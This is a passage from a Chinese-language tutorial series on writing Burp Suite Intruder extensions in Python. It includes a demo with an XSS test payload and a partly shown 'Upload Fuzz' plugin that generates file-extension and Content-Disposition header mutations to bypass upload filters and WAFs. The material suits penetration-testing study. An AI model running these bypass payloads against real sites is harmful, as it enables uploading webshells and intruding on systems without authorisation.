+<h3 id="0x02-IIntruderPayloadGenerator"><a href="#0x02-IIntruderPayloadGenerator" class="headerlink" title="0x02 IIntruderPayloadGenerator"></a><em><strong>0x02 IIntruderPayloadGenerator</strong></em></h3><p>此接口用于自定义的Intruder有效负载生成器。IIntruderPayloadGeneratorFactory作为新的Intruder攻击的一部分，需要时，已注册的扩展 必须返回此接口的新实例。</p>
+<p>官方api：[<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IIntruderPayloadGenerator.html]">https://portswigger.net/burp/extender/api/burp/IIntruderPayloadGenerator.html]</a><br> (<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IIntruderPayloadGenerator.html">https://portswigger.net/burp/extender/api/burp/IIntruderPayloadGenerator.html</a>)</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/49.jpg" alt="图片"></p>
+<p>首先得定义一个类，继承IIntruderPayloadGenerator类，然后定义__init__方法，_payloadIndex变量是每个具体的攻击载荷的下标。例如我们设置的攻击载荷PAYLOADS是一个列表，那么_payloadIndex就是每个具体的攻击载荷的下标。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class IntruderPayloadGenerator(IIntruderPayloadGenerator):</span><br><span class="line">   def __init__(self):     self._payloadIndex &#x3D; 0</span><br></pre></td></tr></table></figure>
+
+<p>该类有三个方法：hasMorePayloads, getNextPayload, reset</p>
+<h3 id="0x03-hasMorePayloads"><a href="#0x03-hasMorePayloads" class="headerlink" title="0x03 hasMorePayloads"></a><em><strong>0x03 hasMorePayloads</strong></em></h3><p>Burp使用此方法来获取有效负载生成器的名称。当用户选择使用扩展生成的有效内容时，这将作为选项显示在Intruder UI中。</p>
+<p>返回值：有效负载生成器的名称。</p>
+<p>官方api：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IIntruderPayloadGenerator.html#hasMorePayloads()">https://portswigger.net/burp/extender/api/burp/IIntruderPayloadGenerator.html#hasMorePayloads()</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/50.jpg" alt="图片"></p>
+<p>示例代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def hasMorePayloads(self):</span><br><span class="line">   print &quot;hasMorePayloads called.&quot;</span><br><span class="line">   return self._payloadIndex &lt; len(PAYLOADS)</span><br></pre></td></tr></table></figure>
+
+<p>其实hasMorePayloads方法就是返回一个布尔值，如果_payloadIndex的值比PAYLOADS的个数小，说明没有加载完所有payload，那么就返回true，然后继续返回下一个payload。否则就结束，不再返回下一个payload。</p>
+<h3 id="0x04-getNextPayload"><a href="#0x04-getNextPayload" class="headerlink" title="0x04 getNextPayload"></a><em><strong>0x04 getNextPayload</strong></em></h3><p>Burp使用此方法来获取下一个有效负载的值。</p>
+<p>返回值：攻击中使用的下一个有效负载。</p>
+<p>官方api：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IIntruderPayloadGenerator.html#getNextPayload(byte[])">https://portswigger.net/burp/extender/api/burp/IIntruderPayloadGenerator.html#getNextPayload(byte[])</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/51.jpg" alt="图片"></p>
+<p>示例代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def getNextPayload(self, baseValue):</span><br><span class="line">   payload &#x3D; &quot;&quot;.join(chr(x) for x in baseValue)  # 通过该行代码将array(&#39;b&#39;, [106, 112, 103])转换为jpg字符串</span><br><span class="line">   attackPayload &#x3D; payload + &quot;&#39;&quot;  # 设置攻击payload</span><br><span class="line">   print &#39;attackPayload: &#123;&#125;&#39;.format(attackPayload)   self._payloadIndex +&#x3D; 1</span><br><span class="line">   return attackPayload</span><br></pre></td></tr></table></figure>
+
+<p>baseValue就是再Intruder模块里设置的变量的值。</p>
+<p>这里举个例子：假设我们再数据包里将jpg这个字符串设置为变量，那么baseVul的值是十进制数组：array(‘b’, [106, 112, 103])。那么我们首先要把baseVul的值还原为字符串，所以用””.join(chr(x) for x in  baseValue)这行代码还原成jpg字符串。</p>
+<p>然后接下来就是要生成新的payload了，比如在jpg后面添加payload，或者直接替换jpg字符串等等，然后赋值给新的变量attackPayload。</p>
+<p>接着_payloadIndex的值递增1，然后return返回attackPayload变量即可。</p>
+<h3 id="0x05-reset"><a href="#0x05-reset" class="headerlink" title="0x05 reset"></a><em><strong>0x05 reset</strong></em></h3><p>Burp使用此方法重置有效负载生成器的状态，以便下一次调用 getNextPayload()再次返回第一个有效负载。当攻击将同一个有效载荷生成器用于多个有效载荷位置时，例如在狙击攻击中，将调用此方法。</p>
+<p>官方api：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IIntruderPayloadGenerator.html#reset()">https://portswigger.net/burp/extender/api/burp/IIntruderPayloadGenerator.html#reset()</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def reset(self):</span><br><span class="line">   print &quot;reset called.&quot;</span><br><span class="line">   self._payloadIndex &#x3D; 0</span><br></pre></td></tr></table></figure>
+
+<p>其实就是把_payloadIndex这个变量下标清零。那么当我们使用Intruder模块设置了两个变量的时候，PAYLOADS里的所有攻击载荷就会应用到第二个变量里。</p>
+<p>通过IntruderPayloadGenerator学习了如何遍历我们自己定义的payloads，那么如果我们要想对我们的payloads进行各种处理，例如编码，加密，解密等等。那么这时候就要用到IIntruderPayloadProcessor类。</p>
+<h3 id="0x06-IIntruderPayloadProcessor"><a href="#0x06-IIntruderPayloadProcessor" class="headerlink" title="0x06 IIntruderPayloadProcessor"></a><em><strong>0x06 IIntruderPayloadProcessor</strong></em></h3><p>简单来说就是对payload进行编码，加密等各种处理。</p>
+<p>扩展可以实现此接口，然后调用 IBurpExtenderCallbacks.registerIntruderPayloadProcessor()以注册自定义的Intruder有效负载处理器。</p>
+<p>官方api：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IIntruderPayloadProcessor.html">https://portswigger.net/burp/extender/api/burp/IIntruderPayloadProcessor.html</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/53.jpg" alt="图片"></p>
+<p>该类有两个方法：getProcessorName,processPayload</p>
+<h3 id="0x07-getProcessorName"><a href="#0x07-getProcessorName" class="headerlink" title="0x07 getProcessorName"></a><em><strong>0x07 getProcessorName</strong></em></h3><p>Burp使用此方法来获取有效负载处理器的名称。当用户选择使用扩展提供的有效负载处理器时，这将在Intruder UI中作为选项显示。</p>
+<p>返回值：有效负载处理器的名称。</p>
+<p>官方api：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IIntruderPayloadProcessor.html#getProcessorName()">https://portswigger.net/burp/extender/api/burp/IIntruderPayloadProcessor.html#getProcessorName()</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/54.jpg" alt="图片"></p>
+<p>示例代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def getProcessorName(self):   return &quot;Serialized input wrapper&quot;</span><br></pre></td></tr></table></figure>
+
+<p>效果如下</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/55.jpg" alt="图片"></p>
+<h3 id="0x08-processPayload"><a href="#0x08-processPayload" class="headerlink" title="0x08 processPayload"></a><em><strong>0x08 processPayload</strong></em></h3><p>每次将处理器应用于入侵者有效负载时，Burp都会调用此方法。</p>
+<p>参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">currentPayload -要处理的有效载荷的值。originalPayload -在通过任何已经应用的处理规则进行处理之前，原始有效负载的值。baseValue -有效负载位置的基值，它将用当前有效负载替换。</span><br></pre></td></tr></table></figure>
+
+<p>返回值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">已处理的有效负载的值。这可能 null表明当前的有效负载应被跳过，攻击将直接移至下一个有效负载。</span><br></pre></td></tr></table></figure>
+
+<p>官方api：<br><a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/burp/IIntruderPayloadProcessor.html#processPayload(byte[],%20byte[],%20byte[])">https://portswigger.net/burp/extender/api/burp/IIntruderPayloadProcessor.html#processPayload(byte[],%20byte[],%20byte[])</a></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/56.jpg" alt="图片"></p>
+<p>示例代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def processPayload(self, currentPayload, originalPayload, baseValue):</span><br><span class="line">   payload &#x3D; &quot;&quot;.join(chr(x) for x in currentPayload)   return  self._helpers.stringToBytes(     self._helpers.urlEncode(self._helpers.base64Encode(payload)))</span><br></pre></td></tr></table></figure>
+
+<p>这段代码同样关键，是对payload进行处理，例如编码，加密，解密。根据自己的需求，对currentPayload, originalPayload, baseValue这三个变量进行处理。</p>
+<h3 id="0x09-简单的demo代码"><a href="#0x09-简单的demo代码" class="headerlink" title="0x09 简单的demo代码"></a><em><strong>0x09 简单的demo代码</strong></em></h3><p>示例如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from burp import IBurpExtender</span><br><span class="line">from burp import IIntruderPayloadGeneratorFactory</span><br><span class="line">from burp import IIntruderPayloadProcessor</span><br><span class="line">from burp import IIntruderPayloadGenerator# hard-coded payloads# [in  reality, you would use an extension for something cleverer than  this]PAYLOADS &#x3D; [</span><br><span class="line">   bytearray(&quot;|&quot;),</span><br><span class="line">   bytearray(&quot;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&quot;)</span><br><span class="line">]class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory, IIntruderPayloadProcessor):</span><br><span class="line"></span><br><span class="line">   #</span><br><span class="line">   # implement IBurpExtender</span><br><span class="line">   #</span><br><span class="line"></span><br><span class="line">   def registerExtenderCallbacks(self, callbacks):     # obtain an extension helpers object</span><br><span class="line">     self._helpers &#x3D; callbacks.getHelpers()     # set our extension name</span><br><span class="line">     callbacks.setExtensionName(&quot;Custom intruder payloads&quot;)     # register ourselves as an Intruder payload generator</span><br><span class="line">     callbacks.registerIntruderPayloadGeneratorFactory(self)     # register ourselves as an Intruder payload processor</span><br><span class="line">     callbacks.registerIntruderPayloadProcessor(self)   #</span><br><span class="line">   # implement IIntruderPayloadGeneratorFactory</span><br><span class="line">   #</span><br><span class="line"></span><br><span class="line">   def getGeneratorName(self):     return &quot;My custom payloads&quot;</span><br><span class="line"></span><br><span class="line">   def createNewInstance(self, attack):     # return a new IIntruderPayloadGenerator to generate payloads for this attack</span><br><span class="line">     return IntruderPayloadGenerator()   #</span><br><span class="line">   # implement IIntruderPayloadProcessor</span><br><span class="line">   #</span><br><span class="line"></span><br><span class="line">   def getProcessorName(self):     return &quot;originalPayload base64 and url encode&quot;</span><br><span class="line"></span><br><span class="line">   def processPayload(self, currentPayload, originalPayload, baseValue):</span><br><span class="line">     payload &#x3D; &quot;&quot;.join(chr(x) for x in originalPayload)     return self._helpers.stringToBytes(       self._helpers.urlEncode(self._helpers.base64Encode(payload)))## class  to generate payloads from a simple list#class  IntruderPayloadGenerator(IIntruderPayloadGenerator):</span><br><span class="line">   def __init__(self):     self._payloadIndex &#x3D; 0</span><br><span class="line"></span><br><span class="line">   def hasMorePayloads(self):     return self._payloadIndex &lt; len(PAYLOADS)   def getNextPayload(self, baseValue):</span><br><span class="line">     payload &#x3D; PAYLOADS[self._payloadIndex]     self._payloadIndex &#x3D; self._payloadIndex + 1</span><br><span class="line"></span><br><span class="line">​     return payload   def reset(self):     self._payloadIndex &#x3D; 0</span><br></pre></td></tr></table></figure>
+
+<p>效果如下：</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/57.jpg" alt="图片"></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/58.jpg" alt="图片"></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/59.jpg" alt="图片"></p>
+<p>对a-z这几个payload先base64编码，再url编码。</p>
+<p>下节课分享最近开发的Upload Fuzz插件，涵盖各种绕过姿势。</p>
+<h1 id="Burp-Extender-Apis-插件开发-（第十课）"><a href="#Burp-Extender-Apis-插件开发-（第十课）" class="headerlink" title="Burp Extender Apis 插件开发 （第十课）"></a>Burp Extender Apis 插件开发 （第十课）</h1><h3 id="0x01-前言-2"><a href="#0x01-前言-2" class="headerlink" title="0x01 前言"></a><em><strong>0x01 前言</strong></em></h3><p>基于前两节课的学习，已经能够使用api完成简单的Intruder模块的demo，那么只需要增加一个方法生成payloads，然后从payloads取出payload即可。<br>这里分享最近开发的插件，涵盖了各种绕过姿势，以及以前能够过waf的方法（现在可能不适用了，但仍然也是一种思路）<br>现在来讲解生成payloads的方法。<br>其实很多情况都是对下面两行做修改，fuzz</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;zc.jpg&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br></pre></td></tr></table></figure>
+
+<p>那么插件的思路就是将这两行设置为一个变量，然后让插件对这两行数据进行清洗，生成各种上传绕过的新的payload，再让burpsuite发送。</p>
+<p>绕过方法如下：</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/60.jpg" alt="图片"></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/61.jpg" alt="图片"></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/62.jpg" alt="图片"></p>
+<p>然后还有一个地方要注意的就是getNextPayload方法获取下一个payload，因为我们是根据我们设置的那两行变量为模板进行PAYLOADS生成，所以我们得做个条件判断，只有当self._payloadIndex == 0时才会去生成PAYLOADS，否则就是已经生成了PAYLOADS，只需要取下一个值就可以。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 获取下一个payload，然后intruder就会用该payload发送请求</span><br><span class="line">def getNextPayload(self, baseValue):</span><br><span class="line"># print &#39;getNextPayload called&#39;</span><br><span class="line">TEMPLATE &#x3D; &quot;&quot;.join(chr(x) for x in baseValue)</span><br><span class="line">if self._payloadIndex &#x3D;&#x3D; 0:</span><br><span class="line">self.attackPayloads &#x3D; getAttackPayloads(TEMPLATE)</span><br><span class="line">payload &#x3D; self.attackPayloads[self._payloadIndex]</span><br><span class="line">self._payloadIndex &#x3D; self._payloadIndex + 1</span><br><span class="line">return payload</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x02-Upload-Fuzz检测插件"><a href="#0x02-Upload-Fuzz检测插件" class="headerlink" title="0x02 Upload Fuzz检测插件"></a><em><strong>0x02 Upload Fuzz检测插件</strong></em></h3><p>示例代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line"># -*-coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">from burp import IBurpExtender</span><br><span class="line">from burp import IIntruderPayloadGeneratorFactory</span><br><span class="line">from burp import IIntruderPayloadGenerator</span><br><span class="line">import random</span><br><span class="line">from urllib import unquote</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def getAttackPayloads(TEMPLATE):</span><br><span class="line"># 获取文件前后缀</span><br><span class="line">filename_suffix &#x3D; re.search(&#39;filename&#x3D;&quot;.*[.](.*)&quot;&#39;, TEMPLATE).group(1) # jpg</span><br><span class="line">content_type &#x3D; TEMPLATE.split(&#39;\n&#39;)[-1]</span><br><span class="line"></span><br><span class="line">def script_suffix_Fuzz():</span><br><span class="line"># 文件后缀绕过</span><br><span class="line">asp_fuzz &#x3D; [&#39;asp;.jpg&#39;, &#39;asp.jpg&#39;, &#39;asp;jpg&#39;, &#39;asp&#x2F;1.jpg&#39;, &#39;asp&#123;&#125;.jpg&#39;.format(unquote(&#39;%00&#39;)), &#39;asp .jpg&#39;,</span><br><span class="line">&#39;asp_.jpg&#39;, &#39;asa&#39;, &#39;cer&#39;, &#39;cdx&#39;, &#39;ashx&#39;, &#39;asmx&#39;, &#39;xml&#39;, &#39;htr&#39;, &#39;asax&#39;, &#39;asaspp&#39;, &#39;asp;+2.jpg&#39;]</span><br><span class="line">aspx_fuzz &#x3D; [&#39;asPx&#39;, &#39;aspx .jpg&#39;, &#39;aspx_.jpg&#39;, &#39;aspx;+2.jpg&#39;, &#39;asaspxpx&#39;]</span><br><span class="line">php_fuzz &#x3D; [&#39;php1&#39;, &#39;php2&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;pHp&#39;, &#39;php .jpg&#39;, &#39;php_.jpg&#39;, &#39;php.jpg&#39;, &#39;php. .jpg&#39;,</span><br><span class="line">&#39;jpg&#x2F;.php&#39;,</span><br><span class="line">&#39;php.123&#39;, &#39;jpg&#x2F;php&#39;, &#39;jpg&#x2F;1.php&#39;, &#39;jpg&#123;&#125;.php&#39;.format(unquote(&#39;%00&#39;)),</span><br><span class="line">&#39;php&#123;&#125;.jpg&#39;.format(unquote(&#39;%00&#39;)),</span><br><span class="line">&#39;php:1.jpg&#39;, &#39;php::$DATA&#39;, &#39;php::$DATA......&#39;, &#39;ph\np&#39;]</span><br><span class="line">jsp_fuzz &#x3D; [&#39;.jsp.jpg.jsp&#39;, &#39;jspa&#39;, &#39;jsps&#39;, &#39;jspx&#39;, &#39;jspf&#39;, &#39;jsp .jpg&#39;, &#39;jsp_.jpg&#39;]</span><br><span class="line">suffix_fuzz &#x3D; asp_fuzz + aspx_fuzz + php_fuzz + jsp_fuzz</span><br><span class="line"></span><br><span class="line">suffix_payload &#x3D; [] # 保存文件后缀绕过的所有payload列表</span><br><span class="line"></span><br><span class="line">for each_suffix in suffix_fuzz:</span><br><span class="line"># 测试每个上传后缀</span><br><span class="line">TEMP_TEMPLATE &#x3D; TEMPLATE</span><br><span class="line">temp &#x3D; TEMP_TEMPLATE.replace(filename_suffix, each_suffix)</span><br><span class="line">suffix_payload.append(temp)</span><br><span class="line"></span><br><span class="line">return suffix_payload</span><br><span class="line"></span><br><span class="line">def CFF_Fuzz():</span><br><span class="line"># Content-Disposition 绕过 form-data 绕过 filename 绕过</span><br><span class="line"># Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;zc.jpg&quot;</span><br><span class="line">Suffix &#x3D; [&#39;php&#39;, &#39;asp&#39;, &#39;aspx&#39;, &#39;jsp&#39;, &#39;asmx&#39;, &#39;xml&#39;, &#39;html&#39;, &#39;shtml&#39;, &#39;svg&#39;, &#39;swf&#39;, &#39;htaccess&#39;] # 需要测试的能上传的文件类型</span><br><span class="line"># Suffix &#x3D; [&#39;jsp&#39;]</span><br><span class="line">Content_Disposition_payload &#x3D; [] # 保存Content_Disposition绕过的所有payload列表</span><br><span class="line"></span><br><span class="line"># 遍历每个需要测试的上传后缀</span><br><span class="line">for each_suffix in Suffix:</span><br><span class="line"># 测试每个上传后缀</span><br><span class="line">TEMP_TEMPLATE &#x3D; TEMPLATE</span><br><span class="line">TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE.replace(filename_suffix,</span><br><span class="line">each_suffix) # TEMP_TEMPLATE_SUFFIX: Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;zc.后缀&quot;</span><br><span class="line">filename_total &#x3D; re.search(&#39;(filename&#x3D;&quot;.*&quot;)&#39;, TEMP_TEMPLATE_SUFFIX).group(1)</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX)</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX.replace(&#39;Content-Disposition&#39;, &#39;content-Disposition&#39;)) # 改变大小写</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX.replace(&#39;Content-Disposition: &#39;, &#39;content-Disposition:&#39;)) # 减少一个空格</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX.replace(&#39;Content-Disposition: &#39;, &#39;content-Disposition: &#39;)) # 增加一个空格</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(&#39;form-data&#39;, &#39;~form-data&#39;))</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(&#39;form-data&#39;, &#39;f+orm-data&#39;))</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(&#39;form-data&#39;, &#39;*&#39;))</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX.replace(&#39;form-data; &#39;, &#39;form-data; &#39;)) # 增加一个空格</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span 